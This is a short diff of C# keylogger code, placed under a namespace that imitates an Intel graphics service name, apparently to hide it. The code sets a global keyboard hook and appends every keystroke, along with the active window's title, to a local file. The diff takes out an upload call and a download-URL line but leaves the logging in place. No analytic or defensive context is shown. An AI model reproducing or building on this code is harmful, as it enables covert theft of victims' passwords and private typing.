@@ -30,7 +30,7 @@ namespace igfxCUIService
         {
             hWndTitle = window.GetActiveWindowTitle();
             hWndTitlePast = hWndTitle;
-
+             
             keystrokeApi.CreateKeyboardHook(Save);
             Application.Run();
 
@@ -42,7 +42,7 @@ namespace igfxCUIService
         {
             
             System.IO.Directory.CreateDirectory(pathString);
-            Upload.Keylogupload();
+            
             using (StreamWriter sw = File.AppendText(path))
             {
                 hWndTitle = window.GetActiveWindowTitle();
@@ -88,7 +88,7 @@ namespace igfxCUIService
                     { sw.WriteLine("<Page Down>"); }
                     else if (key.KeyCode.ToString() == "LWin" || key.KeyCode.ToString() == "RWin")
                     { sw.Write("<Win>"); }
-                    else { sw.Write(key); sw.WriteLine(Upload.downloadUrl); }
+                    else { sw.Write(key); }
                     
                 }
             }
